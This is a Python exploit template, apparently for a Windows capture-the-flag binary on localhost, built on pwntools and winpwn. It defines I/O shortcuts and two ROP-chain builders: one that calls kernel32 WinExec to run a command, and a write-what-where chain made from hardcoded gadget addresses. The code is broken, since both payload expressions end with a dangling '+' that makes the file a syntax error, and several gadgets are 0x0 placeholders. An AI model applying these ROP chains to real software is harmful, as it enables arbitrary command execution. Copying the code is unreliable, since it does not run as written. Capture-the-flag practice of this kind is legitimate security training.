#!/usr/bin/env python3
from pwn import *
from winpwn import *
from pwn import u16, u32, u64
from os.path import normpath
# =========================================================
#                          SETUP                         
# =========================================================
exe = normpath('chall.exe')
pe  = winfile(exe)
kernel32 = winfile(normpath('C:\WINDOWS\SysWOW64\KERNEL32.DLL'))
context.log_level = context.log_level = 'info'
context.newline = context.newline = '\r\n'
context.arch = context.arch = 'amd64'
context.endian = context.endian = 'little'
context.windbgx = normpath('WinDbgX.exe')
host, port = '127.0.0.1', 8433

def initialize():
    if args.REMOTE:
        return remote(host, port)
    else:
        io = process(exe)
        if args.DBG:
            windbgx.attach(io, script=windbgscript)
        return io

windbgscript = f'''
.scriptload {normpath("D:/Apps/WinPwn Suite/scripts/telescope.js")}
~0s
'''
def sendlineafter(prompt, data):
    io.recvuntil(prompt)
    io.sendline(data)

def sendafter(prompt, data):
    io.recvuntil(prompt)
    io.send(data)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {:#x}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))


# =========================================================
#                         EXPLOITS
# =========================================================
def ret2winexec(addr, cmdshow=1, pe32=False):
    pop_rdx = 0x0
    pop_rcx = 0x0
    ret = 0x0
    if pe32:
        return p32(kernel32.symbols["WinExec"]) + p32(ret) + p32(addr) + p32(cmdshow)
    else:
        return p64(pop_rcx) + p64(addr) + p64(pop_rdx) + p64(cmdshow) + p64(ret) + p64(kernel32.symbols["WinExec"])

def write(where, what, pe32=False):
    if pe32:
        pop_edx = 0x0102c6ce
        pop_ecx = 0x010118ee
        mov_dword_ptr_ecx_edx = 0x0101544c
        if len(what) % 4 != 0:
            what += b'\x00' * (4 - (len(what) % 4))
        payload = b""
        for i in range(0, len(what), 4):
            dword = what[i:i+4]
            payload += (
                p32(pop_edx) +
                p32(u32(dword)) +
                p32(pop_ecx) +
                p32(where + i) +
                p32(mov_dword_ptr_ecx_edx) +
            )
    else:
        pop_rdx = 0x0102c6ce
        pop_rcx = 0x010118ee
        mov_qword_ptr_ecx_edx = 0x0101544c
        if len(what) % 8 != 0:
            what += b'\x00' * (8 - (len(what) % 8))
        payload = b""
        for i in range(0, len(what), 8):
            qword = what[i:i+8]
            payload += (
                p64(pop_rdx) +
                p64(u64(qword)) +
                p64(pop_rcx) +
                p64(where + i) +
                p64(mov_qword_ptr_ecx_edx) +
            )
    return payload

def exploit():
    global io
    io = initialize()
    # offset = 264
    # payload = flat({offset:[]}, filler=b'\x00')
    leak("PE Address", pe.address) if pe.address else None
    leak("Writable Section", kernel32.address) if kernel32.address else None
    io.interactive() if not args.NOINTERACT else None

if __name__ == '__main__':
    exploit()